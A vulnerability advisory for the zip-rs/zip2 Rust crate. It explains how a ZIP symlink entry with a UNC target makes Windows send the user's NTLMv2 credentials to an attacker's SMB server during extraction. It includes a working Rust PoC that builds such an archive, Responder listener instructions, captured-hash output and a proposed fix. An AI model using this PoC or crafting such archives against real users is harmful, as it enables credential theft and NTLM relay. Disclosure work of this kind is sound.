---
lang: ja/en
title: "Windows: attacker-controlled symlink target triggers outbound SMB/NTLM authentication via std::fs::metadata() during extraction"
project: zip-rs/zip2
cwe:
  - CWE-918
  - CWE-73
  - CWE-200
severity: medium
cvss: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
score: "5.5"
verified: v9.0.4
affected: ">=1.3.0"
patched: v9.0.0
date: 2026-10-17
---

> [!info] **メンテナの対応:**
>
> - 本脆弱性は，`SymlinkExtractAction::ExtractNoRestrictions` を使用した場合のリスクとして認識されるべきであり，パッチを行うと既存の正常な機能が壊れる可能性があります．
> - デフォルト経路で脆弱だった `v9.0.0` を Patched として，`>=9.0.0` 以降の `SymlinkExtractAction::ExtractNoRestrictions` 経路で NTLMv2 が漏洩しうるリスクがあるというコメントがドキュメントに記載されました．
> - ドキュメント更新は，`v9.1.0` でリリースされました．
>   - [docs: Document a risk involving network-share symlink targets on Windows by Pr0methean · Pull Request #1094 · zip-rs/zip2 · GitHub](https://github.com/zip-rs/zip2/pull/1094)
>   - [Windows: attacker-controlled symlink target triggers outbound SMB/NTLM authentication via std::fs::metadata() during extraction · Advisory · zip-rs/zip2 · GitHub](https://github.com/zip-rs/zip2/security/advisories/GHSA-5qh5-c9fp-66jm)

### Summary

- **Verified version:**
  - v9.0.4 HEAD `master: f14e745111759ed83c832166c4311c736b9d8500`
  - v9.0.0 pre3 `52165b91140f209ba3076b4dd56f61cabd66e33a`
- **Affected versions:** `>=v1.3.0`
  - `>=v1.3.0, <v9.0.0`: fires on the default `extract()`
  - `>=v9.0.0 (including v9.0.4)`: fires only when `SymlinkExtractAction::ExtractNoRestrictions` is set
- **Precondition:** Windows only (the `#[cfg(windows)]` branch of `make_symlink_impl()`); Unix is not affected.

On Windows, `make_symlink_impl` calls `std::fs::metadata(target)` on the archive-supplied target string before creating the symlink, in order to decide whether the target is a file or a directory.
When the target is a UNC path such as `\\attacker\share\x`, `std::fs::metadata()` internally calls `CreateFileW`, and the SMB client attempts to connect to that host.
As part of that connection, Windows may automatically send NTLM authentication (the current user's NTLMv2 challenge-response).

---

### Details

Along the path `ZipArchive::extract() -> make_symlink() -> #[cfg(windows)] make_symlink_impl()`, the target is passed to `std::fs::metadata` without any content validation.

**`src/read/extract.rs: make_symlink_impl()` (L86-109)**

```rust
#[cfg(windows)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    use crate::format::functions::is_dir;
    let target = Path::new(OsStr::new(&target_str));
    let target_is_dir_from_archive =
        is_dir(target_str.as_bytes()) && existing_files.contains_key(target_str.as_bytes());
    let target_is_dir = if target_is_dir_from_archive {
        true
    } else if let Ok(meta) = std::fs::metadata(target) {
        meta.is_dir()
    } else {
        false
    };
    if target_is_dir {
        std::os::windows::fs::symlink_dir(target, outpath)?;
    } else {
        std::os::windows::fs::symlink_file(target, outpath)?;
    }
    Ok(())
}
```

A UNC target has no trailing slash, so `target_is_dir_from_archive` is `false`, and control always reaches the `std::fs::metadata(target)` call (`is_dir` only checks for a trailing `/` or `\` and does not touch the filesystem — `src/format/functions.rs:10`).

### Handling of each target format on HEAD

| Target format          | std interpretation  | Release (plain `extract`) | HEAD default / InFolder         | HEAD `ExtractNoRestrictions` |
| ---------------------- | ------------------- | ------------------------- | ------------------------------- | ---------------------------- |
| `\\host\share\x`       | `UNC` (absolute)    | reaches metadata          | rejected by `strip_base_prefix` | reaches metadata             |
| `//host/share/x`       | `UNC` (absolute)    | reaches                   | rejected                        | reaches                      |
| `\\?\UNC\host\share\x` | `VerbatimUNC`       | reaches                   | rejected                        | reaches                      |
| `\\.\UNC\host\share\x` | `DeviceNS`          | reaches                   | rejected                        | reaches                      |
| `\??\UNC\host\share\x` | no prefix (RootDir) | reaches                   | rejected (RootDir detected)     | reaches                      |

**`src/read/extract.rs: cfg(any(windows, unix)) make_symlink` (L126-151)**

```rust
//...
    let (start, rest) = if target_path.is_absolute() {
        let Some(rest) = crate::path::strip_base_prefix(base, target_path) else {
            return Err(invalid!(
                "make_symlink: Symlink target escapes the destination directory"
            ));
        };
        (base, rest)
    } else {
        // A Windows target such as `C:foo` (relative to the current directory of a
        // drive) or `\foo` (relative to the root of the current drive) is neither
        // absolute nor safely relative: the OS resolves it from somewhere other than
        // the parent of the symlink, so there is nothing meaningful to check here.
        if target_path.components().any(|component| {
            matches!(
                component,
                std::path::Component::Prefix(_) | std::path::Component::RootDir
            )
        }) {
            return Err(invalid!("Invalid symlink target path"));
        }
        let parent = outpath.parent().unwrap_or(base);
        if !parent.starts_with(base) {
            return Err(invalid!("Symlink is not inside the destination directory"));
        }
        (parent, target_path)
    };
//...
```

On HEAD, with the default (`ExtractRecursiveInFolder`) / `ExtractInFolder` actions, `make_symlink` (`src/read/extract.rs: L126-151`) rejects an absolute-path target early unless it passes `strip_base_prefix`, so `make_symlink_impl` is never reached. A UNC target denotes a different volume from the canonicalized local destination, so `strip_base_prefix` returns `None` and the target is rejected. Targets that parse with a `RootDir`/`Prefix` component (e.g. `\??\UNC\...`) are rejected by the relative-branch check above.

**`src/read/extract.rs: extract_internal` (L510-516)**

```rust
#[cfg(any(unix, windows))]
SymlinkExtractAction::ExtractNoRestrictions => {
    let Ok(target_str) = std::str::from_utf8(&target) else {
        return Err(invalid!("Invalid UTF-8 as symlink target"));
    };
    make_symlink_impl(&outpath, target_str, &self.shared.files)?;
}
```

Because `src/read/extract.rs: L510-516` calls `make_symlink_impl` directly, the only path that remains on HEAD is the **explicit `ExtractNoRestrictions`** one.

#### Root Cause

1. `std::fs::metadata()` runs _before_ the symlink is created.
   Creating a symlink on Windows requires `SeCreateSymbolicLinkPrivilege` (administrator / Developer Mode), but `metadata()` is reached even with ordinary user privileges.
   Therefore, even if `symlink_file()` later fails due to insufficient privileges, the SMB connection and authentication can already have occurred at that point.
2. Apart from checking that the target is valid UTF-8, `make_symlink()` / `make_symlink_impl()` perform no validation of the target's content (outside the default path).

---

### PoC

A minimal PoC for verification on a real Windows host is provided (`tests/poc_windows_ntlm.rs`).
The destination host is **specified by the tester via the environment variable `ZIP2_POC_UNC_HOST`**.
Run it against an SMB listener that the tester themselves controls.

- `unc_target_triggers_metadata_before_symlink_creation()`: for `>=v1.3.0, <v9.0.0`
- `unc_target_via_no_restrictions_head_only()`: for `>=v9.0.0, HEAD`

```rust
//! Windows PoC:
//! A symlink entry's UNC target triggers outbound SMB/NTLM authentication.
//!
//! - author: sl91994
//!
//! Mechanism:
//! On Windows, `make_symlink_impl` calls `std::fs::metadata` on the attacker-controlled
//! target before creating the symlink. If the target is a UNC path, the Windows SMB
//! client connects and authenticates.
//!
//! Usage:
//!   1. Start an SMB listener on the attacker machine (e.g.):
//!        `responder -I <iface> -v`
//!   2. Set the attacker's IP/name via an environment variable and run on the Windows (victim) host:
//!        `set ZIP2_POC_UNC_HOST=<attacker_ip>`
//!        `cargo test --test poc_windows_ntlm unc_target_via_no_restrictions_head_only -- --nocapture --ignored`
//!        `cargo test --test poc_windows_ntlm unc_target_triggers_metadata_before_symlink_creation -- --nocapture --ignored`
//!   3. NTLMv2 authentication arrives at the listener.

#![cfg(windows)]

use std::io::{Cursor, Write};
use std::path::Path;

use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipArchive, ZipWriter};

/// Build a ZIP containing a single symlink entry.
fn build_zip_with_symlink(name: &str, target: &str) -> Vec<u8> {
    let opt = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    zip.add_symlink(name, target, opt).unwrap();
    // metadata() is called on the target itself before the symlink is created.
    zip.finish().unwrap().into_inner()
}

fn report_link_state(link: &Path) {
    match std::fs::symlink_metadata(link) {
        Ok(m) => println!(
            "link entry exists: is_symlink={}, is_file={}",
            m.file_type().is_symlink(),
            m.is_file()
        ),
        Err(e) => println!("link entry not created ({e}); metadata() may still have run"),
    }
}

/// v9.0.0 pre3 and earlier.
#[test]
#[ignore = "involving outbound SMB connections"]
fn unc_target_triggers_metadata_before_symlink_creation() {
    let host = std::env::var("ZIP2_POC_UNC_HOST").expect(
        "set the target host in ZIP2_POC_UNC_HOST (the IP/HOST of an SMB listener the tester controls)",
    );
    // The UNC path, share name, and file name are arbitrary.
    let target = format!(r"\\{host}\share\probe");
    println!("symlink target = {target}");

    let buf = build_zip_with_symlink("link", &target);

    let dest = std::env::temp_dir().join("zip2_poc_ntlm");
    let _ = std::fs::remove_dir_all(&dest);
    std::fs::create_dir_all(&dest).unwrap();

    // In release builds (v1.3.0+), a plain extract() enters this path.
    let res = ZipArchive::new(Cursor::new(buf)).unwrap().extract(&dest);
    println!("extract() returned: {res:?}");

    // The success of extract() does not matter (even if symlink creation fails due to
    // insufficient privileges, the preceding metadata() still triggers the SMB/NTLM connection).
    report_link_state(&dest.join("link"));
}

/// To test the ExtractNoRestrictions path: v9.0.0 and later (including v9.0.4).
#[test]
#[ignore = "involving outbound SMB connections"]
fn unc_target_via_no_restrictions_head_only() {
    // Older versions lack this API and would fail to compile, so uncomment only on HEAD.
    use zip::read::{ExtractOptions, SymlinkExtractAction};
    let host = std::env::var("ZIP2_POC_UNC_HOST").expect("set ZIP2_POC_UNC_HOST");
    let target = format!(r"\\{host}\share\probe");
    let buf = build_zip_with_symlink("link", &target);
    let dest = std::env::temp_dir().join("zip2_poc_ntlm_head");
    let _ = std::fs::remove_dir_all(&dest);
    std::fs::create_dir_all(&dest).unwrap();
    let res = ZipArchive::new(Cursor::new(buf))
        .unwrap()
        .extract_with_options(
            &dest, ExtractOptions::default().symlink_action(SymlinkExtractAction::ExtractNoRestrictions),
        );
    println!("extract_with_options(NoRestrictions) returned: {res:?}");
}
```

For verification, a **Windows 11 (victim VM) and Ubuntu (attacker VM)** were used on a host-only network, with Responder's poisoning features disabled.
The following versions were tested, and NTLMv2 authentication was confirmed in every case:

- **legacy `unc_target_triggers_metadata_before_symlink_creation()`:** confirmed on v9.0.0 pre3 `4e15a847e72dd942a5f0605cf4dd7471d65ba9fc`
- **head `unc_target_via_no_restrictions_head_only()`:** confirmed on v9.0.4 `52165b91140f209ba3076b4dd56f61cabd66e33a`

**PoC output**

```shell
# All poisoning features Off; only HTTP/SMB On
$ sudo python3 Responder.py -I ens33 -v

# Legacy
[SMB] NTLMv2-SSP Client   : <victim_ip>
[SMB] NTLMv2-SSP Username : .\victim
[SMB] NTLMv2-SSP Hash     : victim::.:XXXX:XXXX:XXXX
# HEAD
[SMB] NTLMv2-SSP Client   : <victim_ip>
[SMB] NTLMv2-SSP Username : .\victim
[SMB] NTLMv2-SSP Hash     : victim::.:XXXX:XXXX:XXXX
```

### WebDAV note (when 445/tcp is blocked)

With a literal IP address (e.g. `<attacker_ip>@80` / `<attacker>@SSL@443`), WebDAV's automatic NTLM does not occur.
This path is exploitable only when, instead of an IP address, a **dot-less single label name is resolvable to the attacker (Intranet Zone)**.

Satisfying these via poisoning requires the attacker and victim to be **on the same L2 segment**.
Without poisoning, the attack would require permission to change the victim's configuration, so it is not realistically feasible.

- **SMB:** exploitable with an IP alone
- **WebDAV:** zone-dependent

---

### Impact

Without knowing the victim's computer name or any credentials, an attacker can have the victim extract a malicious ZIP on Windows and thereby make the victim's host send authentication material to the attacker's SMB server.
The captured NTLMv2 response can be used for offline cracking or NTLM relay.

On the latest release versions, the following must hold:

- The upstream application explicitly enables `SymlinkExtractAction::ExtractNoRestrictions`. (It does not fire under the default `ExtractRecursiveInFolder`.)
- The upstream environment does not block outbound traffic on 445/tcp. (Or the attacker is on the same L2 segment.)

---

### Suggested Fix

The root cause is that `make_symlink_impl` (windows) runs `std::fs::metadata()` on the attacker-controlled `target` string solely to decide the dir/file kind.
The dir/file distinction only affects the _kind of symlink created_ (`symlink_dir` / `symlink_file`) and is irrelevant to safety.

Therefore, by **deciding the kind from in-archive information alone, without touching the filesystem at all, and falling back to a file symlink when it is unknown**, the side effect of connecting to SMB/WebDAV can be eliminated.

This function is the single point through which both the legacy default path and the HEAD `ExtractNoRestrictions` path pass, so this fix closes the firing path for both version lines.

```rust
#[cfg(windows)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    use crate::format::functions::is_dir;
    let target = Path::new(OsStr::new(&target_str));

    // Decide dir-vs-file WITHOUT touching the filesystem.
    // The dir/file distinction only affects the *kind* of symlink created,
    // never safety, so derive it from archive metadata alone and fall back to a
    // file symlink when the target is not a known in-archive directory.
    let target_is_dir =
        is_dir(target_str.as_bytes()) && existing_files.contains_key(target_str.as_bytes());

    if target_is_dir {
        std::os::windows::fs::symlink_dir(target, outpath)?;
    } else {
        std::os::windows::fs::symlink_file(target, outpath)?;
    }
    Ok(())
}
```

After applying the fix, the PoC was run again and confirmed to send no NTLM-related packets and perform no authentication.

#### Behavioral change and trade-off

- A symlink pointing at a **real local directory** that does not exist as a trailing-slash entry inside the archive will now be created as a file symlink rather than a directory symlink.
- On Windows a file symlink still points at the correct path, so resolution itself keeps working in most cases.
